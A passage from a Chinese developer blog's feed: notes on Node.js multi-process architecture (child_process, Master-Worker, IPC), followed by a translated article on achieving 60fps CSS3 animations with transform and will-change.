<h3 id="9-1-3-白银时代：多线程"><a href="#9-1-3-白银时代：多线程" class="headerlink" title="9.1.3 白银时代：多线程"></a>9.1.3 白银时代：多线程</h3><p>为了解决进程复制中的浪费问题，多线程被引入服务模型，让一个线程服务一个请求。线程相对进程的开销要小许多，并且线程之间可以共享数据，内存浪费的问题可以得到解决，并且利用线程池可以减少创建和销毁线程的开销。但是多线程所面临的并发问题只能说比多进程略好，因为每个线程都拥有自己独立的堆栈，这个堆栈都需要占用一定的内存空间。另外，由于一个CPU核心在一个时刻只能做一件事情，操作系统只能通过将CPU切分为时间片的方法，让线程可以较为均匀地使用CPU资源，但是操作系统内核在切换线程的同时也要切换线程的上下文，当线程数量过多时，时间将会被耗用在上下文切换中。所以在大并发量时，多线程结构还是无法做到强大的伸缩性。如果忽略掉多线程上下文切换的开销，假设线程所占用的资源为进程的1/L，受资源上限的影响，它的QPS则为M * L/N。</p>
<h3 id="9-1-4-黄金时代：事件驱动"><a href="#9-1-4-黄金时代：事件驱动" class="headerlink" title="9.1.4 黄金时代：事件驱动"></a>9.1.4 黄金时代：事件驱动</h3><p>多线程的服务模型服役了很长一段时间，Apache就是采用多线程/多进程模型实现的，当并发增长到上万时，内存耗用的问题将会暴露出来，这即是著名的C10k问题。为了解决高并发问题，基于事件驱动的服务模型出现了，像Node与Nginx均是基于事件驱动的方式实现的，采用单线程避免了不必要的内存开销和上下文切换开销。<br>基于事件的服务模型存在的问题即是本章起始时提及的两个问题：CPU的利用率和进程的健壮性。单线程的架构并不少见，其中尤以PHP最为知名——在PHP中没有线程的支持。它的健壮性是由它给每个请求都建立独立的上下文来实现的。但是对于Node来说，所有请求的上下文都是统一的，它的稳定性是亟需解决的问题。由于所有处理都在单线程上进行，影响事件驱动服务模型性能的点在于CPU的计算能力，它的上限决定这类服务模型的性能上限，但它不受多进程或多线程模式中资源上限的影响，可伸缩性远比前两者高。如果解决掉多核CPU的利用问题，带来的性能上提升是可观的。</p>
<h3 id="9-2-多进程架构"><a href="#9-2-多进程架构" class="headerlink" title="9.2 多进程架构"></a>9.2 多进程架构</h3><h3 id="多进程架构"><a href="#多进程架构" class="headerlink" title="多进程架构"></a>多进程架构</h3><p>面对单进程单线程对多核使用不足的问题，前人的经验是启动多进程即可。理想状态下每个进程各自利用一个CPU，以此实现多核CPU的利用。所幸，Node提供了<code>child_process</code> 模块，并且也提供了<code>child_process.fork()</code> 函数供我们实现进程的复制。我们再一次将经典的示例代码存为worker.js文件，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</div><div class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  res.writeHead(<span class="number">200</span>, &#123;</div><div class="line">    <span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span></div><div class="line">  &#125;);</div><div class="line">  res.end(<span class="string">'Hello World\n'</span>);</div><div class="line">&#125;).listen(<span class="built_in">Math</span>.round((<span class="number">1</span> + <span class="built_in">Math</span>.random()) * <span class="number">1000</span>), <span class="string">'127.0.0.1'</span>);</div></pre></td></tr></table></figure>
<p>通过node worker.js启动它，将会侦听1000到2000之间的一个随机端口。<br>将以下代码存为master.js，并通过node master.js启动它：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> fork = <span class="built_in">require</span>(<span class="string">'child_process'</span>).fork;</div><div class="line"><span class="keyword">var</span> cpus = <span class="built_in">require</span>(<span class="string">'os'</span>).cpus();</div><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cpus.length; i++) &#123;</div><div class="line">  fork(<span class="string">'./worker.js'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这段代码将会根据当前机器上的CPU数量复制出对应Node进程数。在*nix系统下可以通过</p>
<p><code>ps aux | grep worker.js</code> 查看到进程的数量，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ ps aux | grep worker.js</div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">jacksontian 1475 0.0 0.0 2432768 600 s003 S+ 3:27AM 0:00.00 </div><div class="line"></div><div class="line">grep worker.js jacksontian 1440 0.0 0.2 3022452 12680 s003 S 3:25AM 0:00.14 </div><div class="line"></div><div class="line">/usr/<span class="built_in">local</span>/bin/node ./worker.js</div><div class="line">jacksontian 1439 0.0 0.2 3023476 12716 s003 S 3:25AM 0:00.14 </div><div class="line">/usr/<span class="built_in">local</span>/bin/node ./worker.js </div><div class="line">jacksontian 1438 0.0 0.2 3022452 12704 s003 S 3:25AM 0:00.14 </div><div class="line">/usr/<span class="built_in">local</span>/bin/node ./worker.js</div><div class="line">jacksontian 1437 0.0 0.2 3031668 12696 s003 S 3:25AM 0:00.15 </div><div class="line">/usr/<span class="built_in">local</span>/bin/node ./worker.js</div></pre></td></tr></table></figure>
<p>图9-1就是著名的Master-Worker模式，又称主从模式。图9-1中的进程分为两种：主进程和工作进程。</p>
<p>这是典型的分布式架构中用于并行处理业务的模式，具备较好的可伸缩性和稳定性。主进程不负责具体的业务处理，而是负责调度或管理工作进程，它是趋向于稳定的。工作进程负责具体的业务处理，因为业务的多种多样，甚至一项业务由多人开发完成，所以工作进程的稳定性值得开发者关注。</p>
<p>图9-1　Master-Worker模式通过fork()复制的进程都是一个独立的进程，这个进程中有着独立而全新的V8实例。它需要至少30毫秒的启动时间和至少10 MB的内存。尽管Node提供了fork()供我们复制进程使每个CPU内核都使用上，但是依然要切记fork()进程是昂贵的。好在Node通过事件驱动的方式在单线程上解决了大并发的问题，这里启动多个进程只是为了充分将CPU资源利用起来，而不是为了解决并发问题。</p>
<h3 id="9-2-1-创建子进程"><a href="#9-2-1-创建子进程" class="headerlink" title="9.2.1 创建子进程"></a>9.2.1 创建子进程</h3><p>创建子进程<br><code>child_process</code> 模块给予Node可以随意创建子进程（<code>child_process</code>）的能力。它提供了4个方法用于创建子进程。</p>
<ul>
<li>spawn()：启动一个子进程来执行命令。</li>
<li>exec()：启动一个子进程来执行命令，与spawn()不同的是其接口不同，它有一个回调函数获知子进程的状况。</li>
<li>execFile()：启动一个子进程来执行可执行文件。</li>
<li>fork()：与spawn()类似，不同点在于它创建Node的子进程只需指定要执行的JavaScript文件模块即可。</li>
</ul>
<p>spawn()与exec()、execFile()不同的是，后两者创建时可以指定timeout属性设置超时时间，一旦创建的进程运行超过设定的时间将会被杀死。</p>
<p>exec()与execFile()不同的是，exec()适合执行已有的命令，execFile()适合执行文件。这里我们以一个寻常命令为例，<code>node worker.js</code> 分别用上述4种方法实现，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> cp = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</div><div class="line">cp.spawn(<span class="string">'node'</span>, [<span class="string">'worker.js'</span>]);</div><div class="line">cp.exec(<span class="string">'node worker.js'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, stdout, stderr</span>) </span>&#123;</div><div class="line">  <span class="comment">// some code </span></div><div class="line">&#125;);</div><div class="line">cp.execFile(<span class="string">'worker.js'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, stdout, stderr</span>) </span>&#123; </div><div class="line">  <span class="comment">// some code</span></div><div class="line">&#125;);</div><div class="line">cp.fork(<span class="string">'./worker.js'</span>);</div></pre></td></tr></table></figure>
<p>以上4个方法在创建子进程之后均会返回子进程对象。它们的差别可以通过表9-1查看。</p>
<p>这里的可执行文件是指可以直接执行的文件，如果是JavaScript文件通过<code>execFile()</code>运行，它的首行内容必须添加如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">#!/usr/bin/env node</div></pre></td></tr></table></figure>
<p>尽管4种创建子进程的方式有些差别，但事实上后面3种方法都是spawn()的延伸应用。</p>
<h3 id="9-2-2-进程间通信"><a href="#9-2-2-进程间通信" class="headerlink" title="9.2.2 进程间通信"></a>9.2.2 进程间通信</h3><h3 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h3><p>在Master-Worker模式中，要实现主进程管理和调度工作进程的功能，需要主进程和工作进程之间的通信。对于child_process模块，创建好了子进程，然后与父子进程间通信是十分容易的。</p>
<p>在前端浏览器中，JavaScript主线程与UI渲染共用同一个线程。执行JavaScript的时候UI渲染是停滞的，渲染UI时，JavaScript是停滞的，两者互相阻塞。长时间执行JavaScript将会造成UI停顿不响应。为了解决这个问题，HTML5提出了WebWorker API。WebWorker允许创建工作线程并在后台运行，使得一些阻塞较为严重的计算不影响主线程上的UI渲染。它的API如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">'worker.js'</span>);</div><div class="line">worker.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</div><div class="line">  <span class="built_in">document</span>.getElementById(<span class="string">'result'</span>).textContent = event.data;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>其中，worker.js如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> n = <span class="number">1</span>;</div><div class="line">search: <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</div><div class="line">  n += <span class="number">1</span>;</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">2</span>; i &lt;= <span class="built_in">Math</span>.sqrt(n); i += <span class="number">1</span>)</div><div class="line">    <span class="keyword">if</span> (n % i == <span class="number">0</span>)</div><div class="line">      <span class="keyword">continue</span> search; <span class="comment">// found a prime</span></div><div class="line">  postMessage(n);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>主线程与工作线程之间通过onmessage()和postMessage()进行通信，子进程对象则由send()方法实现主进程向子进程发送数据，message事件实现收听子进程发来的数据，与API在一定程度上相似。通过消息传递内容，而不是共享或直接操作相关资源，这是较为轻量和无依赖的做法。</p>
<p>Node中对应示例如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="comment">// parent.js var cp = require('child_process');</span></div><div class="line"><span class="keyword">var</span> n = cp.fork(__dirname + <span class="string">'/sub.js'</span>);</div><div class="line">n.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">m</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'PARENT got message:'</span>, m);</div><div class="line">&#125;);</div><div class="line">n.send(&#123;</div><div class="line">  <span class="attr">hello</span>: <span class="string">'world'</span></div><div class="line">&#125;); <span class="comment">// sub.js</span></div><div class="line">process.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">m</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'CHILD got message:'</span>, m);</div><div class="line">&#125;);</div><div class="line">process.send(&#123;</div><div class="line">  <span class="attr">foo</span>: <span class="string">'bar'</span></div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>通过fork()或者其他API，创建子进程之后，为了实现父子进程之间的通信，父进程与子进程之间将会创建IPC通道。通过IPC通道，父子进程之间才能通过message和send()传递消息。</p>
<h3 id="进程间通信原理"><a href="#进程间通信原理" class="headerlink" title="进程间通信原理"></a>进程间通信原理</h3><p><strong>IPC</strong>的全称是<strong>Inter-Process Communication</strong>，即进程间通信</p>
<p>进程间通信的目的是为了让不同的进程能够互相访问资源并进行协调工作。</p>
<p>实现进程间通信的技术有很多，如<strong>命名管道</strong>、<strong>匿名管道</strong>、<strong>socket</strong>、<strong>信号量</strong>、<strong>共享内存</strong>、<strong>消息队列</strong>、<strong>Domain Socket</strong> 等。</p>
<p>Node中实现IPC通道的是管道（pipe）技术。但此管道非彼管道，在Node中管道是个抽象层面的称呼，具体细节实现由libuv提供，在Windows下由命名管道（named pipe）实现，*nix系统则采用Unix Domain Socket实现。表现在应用层上的进程间通信只有简单的message事件和send()方法，接口十分简洁和消息化。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;深入浅出Node-js&quot;&gt;&lt;a href=&quot;#深入浅出Node-js&quot; class=&quot;headerlink&quot; title=&quot;深入浅出Node.js&quot;&gt;&lt;/a&gt;深入浅出Node.js&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;朴灵&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;1-
    
    </summary>
    
      <category term="Node" scheme="http://www.wanglinzhizhi.me/categories/Node/"/>
    
    
      <category term="JS" scheme="http://www.wanglinzhizhi.me/tags/JS/"/>
    
      <category term="Node" scheme="http://www.wanglinzhizhi.me/tags/Node/"/>
    
  </entry>
  
  <entry>
    <title>使用 CSS3实现60帧 的动画</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/23/%E4%BD%BF%E7%94%A8%20CSS3%20%E5%AE%9E%E7%8E%B0%2060%20%E5%B8%A7%E7%9A%84%E5%8A%A8%E7%94%BB/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/23/使用 CSS3 实现 60 帧的动画/</id>
    <published>2017-01-23T11:16:10.000Z</published>
    <updated>2017-01-23T11:46:56.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="如丝般顺滑：使用-CSS3-实现-60-帧的动画"><a href="#如丝般顺滑：使用-CSS3-实现-60-帧的动画" class="headerlink" title="如丝般顺滑：使用 CSS3 实现 60 帧的动画"></a>如丝般顺滑：使用 CSS3 实现 60 帧的动画</h2><p><em>2016-08-17</em> <em>yanni4night</em> <a href="http://mp.weixin.qq.com/s?__biz=MzA4NjE3MDg4OQ==&amp;mid=2650963599&amp;idx=1&amp;sn=bb28e6cf0e3146252313d22fe42cb885&amp;scene=0##" target="_blank" rel="external">奇舞周刊</a></p>
<p>编者按：本文由yanni4night在众成翻译平台上翻译，英文原文：<a href="https://medium.com/outsystems-experts/how-to-achieve-60-fps-animations-with-css3-db7b98610108#.vfuqpb6vu" target="_blank" rel="external">https://medium.com/outsystems-experts/how-to-achieve-60-fps-animations-with-css3-db7b98610108#.vfuqpb6vu</a></p>
<p>在移动端上实现动画很简单。</p>
<p>在移动端上正确地实现动画也比较简单…如果你采纳我们的建议的话。</p>
<p>虽然现在每个人都会使用 CSS3 实现动画，但许多人用的都不够恰当。很多应加以考虑的最佳实践常常被忽略，因为仍然有人不明白这些最佳实践的真正意义。</p>
<p>如今有这么多的设备规范，如果还不有针对性地优化你的代码，糟糕的用户体验将让你死无葬身之地。</p>
<p>记住：虽然市场上始终有一些高端的旗舰机在挑战性能极限，但你面对的仍将是和这些性能怪兽相比只是玩具一样的低端设备。</p>
<p>我们想帮助你正确地驾驭 CSS3。首先先要了解几件事。</p>
<h3 id="了解时间轴"><a href="#了解时间轴" class="headerlink" title="了解时间轴"></a>了解时间轴</h3><p>当渲染和处理 HTML 元素时，浏览器做了什么？这个时间轴叫做关键渲染路径。</p>
<p><img src="/images/60pfs/1.png" alt="img"></p>
<p>想达到流畅的动画效果我们需要关注修改属性对合成（Composite）阶段的影响，而不是其它阶段。</p>
<h4 id="1-样式"><a href="#1-样式" class="headerlink" title="1. 样式"></a>1. 样式</h4><p><img src="/images/60pfs/2.png" alt="img"><br>浏览器开始计算应用于元素的样式 —— 重计算样式。</p>
<h4 id="2-布局"><a href="#2-布局" class="headerlink" title="2. 布局"></a>2. 布局</h4><p><img src="/images/60pfs/3.png" alt="img"></p>
<p>下一步，浏览器开始为每个元素生成形状和位置 —— 布局。这是浏览器设置页面属性的地方，如 width 和 height，以及 margin 或者 left、top、right、bottom。</p>
<h4 id="3-渲染"><a href="#3-渲染" class="headerlink" title="3. 渲染"></a>3. 渲染</h4><p><img src="/images/60pfs/4.png" alt="img"></p>
<p>浏览器开始向层中填充像素。要使用的属性有 box-shadow，border-radius，color，background-color 等等。</p>
<h4 id="4-合成"><a href="#4-合成" class="headerlink" title="4. 合成"></a>4. 合成</h4><p>这就是你动手脚的地方了，因为浏览器开始把所有层画到屏幕上。</p>
<p><img src="/images/60pfs/5.png" alt="img"></p>
<p>现代浏览器能够通过使用 transform 和 opacity 完美运行 4 种样式。</p>
<ul>
<li>位置 — transform: translateX(<em>n</em>) translateY(<em>n</em>) translateZ(<em>n</em>);</li>
<li>缩放 — transform: scale(<em>n</em>);</li>
<li>旋转 — transform: rotate(<em>n</em> deg);</li>
<li>透明 — opacity: <em>n</em>;</li>
</ul>
<h3 id="如何达到-60-帧每秒"><a href="#如何达到-60-帧每秒" class="headerlink" title="如何达到 60 帧每秒"></a>如何达到 60 帧每秒</h3><p>想法有了，让我们撸起袖子开始干活吧。</p>
<p>我们从 HTML 开始，创建一个非常简单的结构，并把类名 app-menu 的元素放入类名 layout 的元素中。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"layout"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">”app-menu”</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">”header”</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
<p><img src="/images/60pfs/6.gif" alt="img"></p>
<h3 id="错误做法"><a href="#错误做法" class="headerlink" title="错误做法"></a>错误做法</h3><figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-class">.app-menu</span> &#123;</div><div class="line">  <span class="attribute">left</span>: -<span class="number">300px</span>;</div><div class="line">  <span class="attribute">transition</span>: left <span class="number">300ms</span> linear;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-class">.app-menu-open</span> <span class="selector-class">.app-menu</span> &#123;</div><div class="line">  <span class="attribute">left</span>: <span class="number">0px</span>;</div><div class="line">  <span class="attribute">transition</span>: left <span class="number">300ms</span> linear;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>看到我们更改的这些属性了吗？你应该避免在 transitions 中使用left、top、right、bottom 属性。它们的更新让浏览器每次都要创建布局，影响所有它们的子元素，进而难以实现流畅的动画。</p>
<p>结果是这样的：</p>
<p><img src="/images/60pfs/7.gif" alt="img"><br>这个动画一点也不流畅。我们通过<a href="undefined">开发者工具</a>检查背后到底发生了什么，请看：</p>
<p><img src="/images/60pfs/8.png" alt="img"></p>
<p>能够清晰地看到 FPS 非常不规则，性能也就比较糟糕。</p>
<h3 id="使用-Transform"><a href="#使用-Transform" class="headerlink" title="使用 Transform"></a>使用 Transform</h3><figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-class">.app-menu</span> &#123;</div><div class="line">  <span class="attribute">-webkit-transform</span>: <span class="built_in">translateX</span>(-100%);</div><div class="line">  <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-100%);</div><div class="line">  <span class="attribute">transition</span>: transform <span class="number">300ms</span> linear;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="selector-class">.app-menu-open</span> <span class="selector-class">.app-menu</span> &#123;</div><div class="line">  <span class="attribute">-webkit-transform</span>: none;</div><div class="line">  <span class="attribute">transform</span>: none;</div><div class="line">  <span class="attribute">transition</span>: transform <span class="number">300ms</span> linear;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>transform 属性会影响合成阶段。在这里浏览器被告知层马上要被渲染，做好准备执行动画，因此动画渲染时卡顿更少。</p>
<p><img src="/images/60fps/9.gif" alt="img"></p>
<p>时间轴：</p>
<p><img src="/images/60fps/10.png" alt="img"></p>
<p>开始有效果了，FPS 变得有规律了，此外，动画变得更流畅了。</p>
<p>FPS 开始优化，并且更加稳定，动画也更流畅。</p>
<h3 id="使用-GPU-执行动画"><a href="#使用-GPU-执行动画" class="headerlink" title="使用 GPU 执行动画"></a>使用 GPU 执行动画</h3><p>百尺竿头更进一步。为了让动画“如丝般顺滑”，我们接下来使用 GPU 来渲染。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-class">.app-menu</span> &#123;</div><div class="line">  <span class="attribute">-webkit-transform</span>: <span class="built_in">translateX</span>(-100%);</div><div class="line">          <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-100%);</div><div class="line">  <span class="attribute">transition</span>: transform <span class="number">300ms</span> linear;</div><div class="line">  <span class="attribute">will-change</span>: transform;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>虽然一些浏览器仍然需要 translateZ() 或 translate3d() 作为备选方案，will-change 被广泛支持已经是势不可挡了。它的功能是把元素提升到另一个层中，这样浏览器就不必关心布局渲染或者绘制了。</p>
<p><img src="/images/11.gif" alt="img"></p>
<p>这样动画能流畅到什么程度？看时间轴：</p>
<p><img src="/images/12.png" alt="img"></p>
<p>动画的 FPS 更稳定了，渲染也更快了。但是有一帧仍然渲染得很久。在开始处还有一点点瓶颈。</p>
<p>记住刚开始创建的 HTML 结构吗？我们用 JavaScript 控制 app-menu div。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">toggleClassMenu</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> layout = <span class="built_in">document</span>.querySelector(<span class="string">".layout"</span>);</div><div class="line">  <span class="keyword">if</span>(!layout.classList.contains(<span class="string">"app-menu-open"</span>)) &#123;</div><div class="line">    layout.classList.add(<span class="string">"app-menu-open"</span>);</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    layout.classList.remove(<span class="string">"app-menu-open"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> oppMenu = <span class="built_in">document</span>.querySelector(<span class="string">".menu-icon"</span>);</div><div class="line"></div><div class="line">oppMenu.addEventListener(<span class="string">"click"</span>, toggleClassMenu, <span class="literal">false</span>);</div></pre></td></tr></table></figure>
<p>问题出在对 layout 元素增加类名上，我们使浏览器计算了不止一次样式 —— 这影响了渲染效果。</p>
<h3 id="如丝般顺滑的-60-帧-FPS"><a href="#如丝般顺滑的-60-帧-FPS" class="headerlink" title="如丝般顺滑的 60 帧 FPS"></a>如丝般顺滑的 60 帧 FPS</h3><p>如果我们在视窗之外创建菜单会如何？这种分离化的区域能够保证只有需要做动画的元素才会被影响。</p>
<p>因此，我们改进下面的 HTML 结构：</p>
<figure class="highlight"><table><tr><td class="code"><pre><div class="line">&lt;div class="menu"&gt;</div><div class="line">    &lt;div class="app-menu"&gt;&lt;/div&gt;</div><div class="line">&lt;/div&gt;</div><div class="line"></div><div class="line">&lt;div class="layout"&gt;</div><div class="line">    &lt;div class="header"&gt;&lt;/div&gt;</div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure>
<p>此外你也可以通过一种略有不同的方式去控制菜单的状态。我们通过 JavaScript 的transitionend 方法，在监控到动画结束时移除这个控制动画的 CSS 类。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">toggleClassMenu</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  myMenu.classList.add(<span class="string">"menu--animatable"</span>);</div><div class="line">  myMenu.classList.add(<span class="string">"menu--visible"</span>);</div><div class="line">  myMenu.addEventListener(<span class="string">"transitionend"</span>, </div><div class="line">  OnTransitionEnd, <span class="literal">false</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">OnTransitionEnd</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  myMenu.classList.remove(<span class="string">"menu--animatable"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">var</span> myMenu = <span class="built_in">document</span>.querySelector(<span class="string">".menu"</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> oppMenu = <span class="built_in">document</span>.querySelector(<span class="string">".menu-icon"</span>);</div><div class="line"></div><div class="line">oppMenu.addEventListener(<span class="string">"click"</span>, toggleClassMenu, <span class="literal">false</span>);</div></pre></td></tr></table></figure>
<p>现在把它们放到一起，然后看效果。</p>
<p>下面是完全正确的使用 CSS3 实现动画的例子：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-class">.menu</span> &#123;</div><div class="line">  <span class="attribute">position</span>: fixed;</div><div class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</div><div class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</div><div class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</div><div class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</div><div class="line">  <span class="attribute">overflow</span>: hidden;</div><div class="line">  <span class="attribute">pointer-events</span>: none;</div><div class="line">  <span class="attribute">z-index</span>: <span class="number">150</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-class">.menu</span>—<span class="selector-tag">visible</span> &#123;</div><div class="line">  <span class="attribute">pointer-events</span>: auto;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-class">.app-menu</span> &#123;</div><div class="line">  <span class="attribute">background-color</span>: <span class="number">#fff</span>;</div><div class="line">  <span class="attribute">color</span>: <span class="number">#fff</span>;</div><div class="line">  <span class="attribute">position</span>: relative;</div><div class="line">  <span class="attribute">max-width</span>: <span class="number">400px</span>;</div><div class="line">  <span class="attribute">width</span>: <span class="number">90%</span>;</div><div class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</div><div class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">2px</span> <span class="number">6px</span> <span class="built_in">rgba</span>(0, 0, 0, 0.5);</div><div class="line">  <span class="attribute">-webkit-transform</span>: <span class="built_in">translateX</span>(-103%);</div><div class="line">  <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-103%);</div><div class="line">  <span class="attribute">display</span>: flex;</div><div class="line">  <span class="attribute">flex-direction</span>: column;</div><div class="line">  <span class="attribute">will-change</span>: transform;</div><div class="line">  <span class="attribute">z-index</span>: <span class="number">160</span>;</div><div class="line">  <span class="attribute">pointer-events</span>: auto;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-class">.menu</span>—<span class="selector-tag">-visible</span><span class="selector-class">.app-menu</span> &#123;</div><div class="line">  <span class="attribute">-webkit-transform</span>: none;</div><div class="line">  <span class="attribute">transform</span>: none;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-class">.menu-</span>—<span class="selector-tag">animatable</span><span class="selector-class">.app-menu</span> &#123;</div><div class="line">  <span class="attribute">transition</span>: all <span class="number">130ms</span> ease-in;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-class">.menu--visible</span><span class="selector-class">.menu</span>—<span class="selector-tag">-animatable</span><span class="selector-class">.app-menu</span> &#123;</div><div class="line">  <span class="attribute">transition</span>: all <span class="number">330ms</span> ease-out;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-class">.menu</span><span class="selector-pseudo">:after</span> &#123;</div><div class="line">  <span class="attribute">content</span>: ‘’;</div><div class="line">  <span class="attribute">display</span>: block;</div><div class="line">  <span class="attribute">position</span>: absolute;</div><div class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</div><div class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</div><div class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</div><div class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</div><div class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(0,0,0,0.4);</div><div class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</div><div class="line">  <span class="attribute">will-change</span>: opacity;</div><div class="line">  <span class="attribute">pointer-events</span>: none;</div><div class="line">  <span class="attribute">transition</span>: opacity <span class="number">0.3s</span> <span class="built_in">cubic-bezier</span>(0,0,0.3,1);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-class">.menu</span><span class="selector-class">.menu--visible</span><span class="selector-pseudo">:after</span>&#123;</div><div class="line">  <span class="attribute">opacity</span>: <span class="number">1</span>;</div><div class="line">  <span class="attribute">pointer-events</span>: auto;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="/images/60pfs/13.gif" alt="img"></p>
<p>时间轴是怎么样的？</p>
<p><img src="/images/60pfs/14.png" alt="img"></p>
<p>如丝般地顺滑，是吧？</p>
<p><strong>Note</strong>: 我跟着做了一遍,demo Git地址: <a href="https://www.yichewx.com/gogs/wanglinzhizhi/high-performance-css3" target="_blank" rel="external">https://www.yichewx.com/gogs/wanglinzhizhi/high-performance-css3</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;如丝般顺滑：使用-CSS3-实现-60-帧的动画&quot;&gt;&lt;a href=&quot;#如丝般顺滑：使用-CSS3-实现-60-帧的动画&quot; class=&quot;headerlink&quot; title=&quot;如丝般顺滑：使用 CSS3 实现 60 帧的动画&quot;&gt;&lt;/a&gt;如丝般顺滑：使用 CSS3 
    
    </summary>
    
      <category term="Web" scheme="http://www.wanglinzhizhi.me/categories/Web/"/>
    
    
      <category term="CSS3" scheme="http://www.wanglinzhizhi.me/tags/CSS3/"/>
    
      <category term="算法" scheme="http://www.wanglinzhizhi.me/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="移动 Web" scheme="http://www.wanglinzhizhi.me/tags/%E7%A7%BB%E5%8A%A8-Web/"/>
    
  </entry>
  
  <entry>
    <title>javascript动态改变css3的animation</title>
